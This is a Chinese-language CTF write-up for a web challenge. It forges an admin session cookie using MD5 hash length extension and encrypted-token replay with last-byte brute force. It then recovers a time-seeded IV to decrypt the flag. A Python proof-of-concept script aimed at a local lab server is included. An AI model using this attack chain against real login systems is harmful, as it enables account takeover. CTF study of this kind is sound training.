
### web300 writeup 

在 www.tar.gz 下载到源码,进行审计:
发现flag已经加密了

```php
require_once('encrypt.php');
file_put_contents('./backup.txt', token_encrypt(file_get_contents('./flag.txt')));
```
由于不知道key,所以要想解密需要用管理员身份:
```php
if ($admin) {
    $text = '';
    if (isset($_POST['do'])) {
        switch ($_POST['do']) {
            case 'encrypt':
                $text = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, get_key(), hex2bin($_POST['text']), MCRYPT_MODE_CFB, hex2bin($_POST['iv'])));
                break;
            case 'decrypt':
                $text = bin2hex(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, get_key(), hex2bin($_POST['text']), MCRYPT_MODE_CFB, hex2bin($_POST['iv'])));
                break;
        }
    }
}
```
所以思路是用重放攻击来伪造管理员身份.
注册一个用户名为 `$user|1|$hash` 的账号,然后用它的身份登陆(登陆不会成功),但是会产生cookie.截取cookie合适的长度,得到`$user|1|$hash`的加密结果,伪造管理员身份.

但是 `$user|1|$hash` 中的`$hash` 没有办法知道,并且在登陆的时候做了验证.
```php
if (isset($_COOKIE['token'])&&isset($_COOKIE['sign'])) {
	$sign = $_COOKIE['sign'];
	$token = $_COOKIE['token'];
	$arr = explode('|', token_decrypt($token));

	if (count($arr) == 3) {
		if (md5(get_indentify().$arr[0]) === $arr[2] && $sign === $arr[2]) {
			$user = $arr[0];
			$admin = (int)$arr[1];
		}
	}
}
```
来看 `sign`和`token` 的产生过程:
```php
$user = $_POST['user'];
				// get_indentify() 获取10位的key,做一个身份签名,防止身份伪造
				
				$md5 = md5(get_indentify().$user);
				$admin = 0;
				// $token = token_encrypt("$user|$admin|$md5");
				$token = token_encrypt("$user|$admin|$md5");
				setcookie('sign',$md5,time()+5*60,"/",'',false,true);
				setcookie('token',$token,time()+5*60,"/",'',false,true);
```

根据`$sign = md5(get_indentify().$user)`知道,这里$sign可以用hash长度扩展攻击,
并且根据注释知道前缀是10位的.

再构造用户名的时候需要注意,因为在加密前进行了位扩展
```php
function pad($str) {
	return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));
}
```
不是16字节的倍数,就补够16的字节的倍数,如果是16字节的倍数,就会在后面再加16字节,这里构造的用户名不应该是16字节的整数倍,而应该是16字节的倍数减1位.
因为需要hash扩展攻击,需要的长度比较多,构造79位的可能容不下hash扩展攻击的冗余字节,所以我这里构造95位的用户名.

解题:
1. 注册一个用户名 wonderkun 获取签名: ee11925035598658e4ea6364806d6796

2. 用户名是9位的,需要扩展的位数为 95-32-3-9=51,所以需要扩展51位, append 的数据随意,只要凑够51位就可以

```bash 
$ python md5pad.py  ee11925035598658e4ea6364806d6796 tadmin 19 
Payload:  '\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x00\x00\x00\x00\x00\x00tadmin'
Payload urlencode: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin
md5: fe46d7d8924ec23d69f8d01432de41aa
```
3. 所以需要构造的用户名为 `wonderkun%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin|1|fe46d7d8924ec23d69f8d01432de41aa`

用这个账号注册一个用户,然后用这个账号登陆获取cookie的token的前190位,就是这95的加密结果,但是95位是需要进行pad的,扩展了一位,所以最后一位的加密结果需要爆破出来:

给出了 python的poc:

```python
#!/usr/bin/python
# coding:utf-8 


import requests

def login():
    url = "http://127.0.0.1:4444/index.php?action=login"
    data = "user=wonderkun%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin|1|fe46d7d8924ec23d69f8d01432de41aa&pwd=1"
    header = {
        "Content-Type":"application/x-www-form-urlencoded"
    }
    
    res = requests.post(url,data=data,allow_redirects=False,proxies={"http":"127.0.0.1:8080"},headers=header)
    return res.cookies['token'][:190]
def getAdminToken(token):
    randstr="0123456789abcdef"
    for i in randstr:
        for j in randstr:
            # token = token+i+j
            url="http://127.0.0.1:4444/index.php?action=home"
            headers = {
                'Cookie':'sign='+'fe46d7d8924ec23d69f8d01432de41aa'+';'+'token='+token+i+j
            }                    
            # print url
            proxy = {"http":"127.0.0.1:8080"}
            res=requests.get(url,headers=headers,proxies=proxy)
            if "User" in res.text:
                print "[*] Cookie:",headers['Cookie']
                return
            else:
                print  "[*] failed"
                # print res.text

if __name__ == "__main__":
    tokenPre=login()
    print tokenPre
    getAdminToken(tokenPre)

```
获取一个可用的cookie,就可以获取一个管理员身份:
```
[*] Cookie: sign=fe46d7d8924ec23d69f8d01432de41aa;token=2a3654363a57be283fbfc6d730c55c646cfe9b1a04c1ff10aa80327828ab6ca990b95fe6a00a9f6494abb1d47321643ed79e8c6b33bb6074e91a5d5be9f92fb5933500e7859129b4dc2c3f99b7738fa4dfed60e2fc8cb34f959e4287ce53185c
```
接下来获取$iv,看backup.txt的时间,
```
Apr 12 09:26  转化为时间戳为: 1491960409 
```
获取$iv:

** 注意这里要用64的linux操作系统产生 iv,windows和linux产生的随机序列是不一样的 **

```php
function getRandChar($length){
	$str = null;
	$strPol = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
	for($i=0;$i<$length;$i++){
		$n = rand(0, strlen($strPol) - 1);
		$str.=$strPol[$n];
	}
	return $str;
}
srand( 1491960409/ 300);
$iv = getRandChar(16);
echo bin2hex($iv);
echo "\n";
```
获取$iv = 6f39784745597a644b52354a50497976
然后解密:backup.txt的内容:
得到flag: flag{660b7b8c06e3150d174a3ec9fcd7ab9d}



### 别的解题思路的wp
- [ ] [chamd5安全团队](http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247483908&idx=1&sn=66a6fb3bdd5bc391791db02f0ced5456&chksm=e89e2adcdfe9a3ca236b95c00a7362bfd3908d3ef69a207efd544e1c9dcc385f5d767605d921&mpshare=1&scene=23&srcid=0417hAKjzBELkY81prwMPZO9#rd)
- [ ] [墨麒麟安全实验](http://www.ifuryst.com/archives/AES_CFB_Attack.html)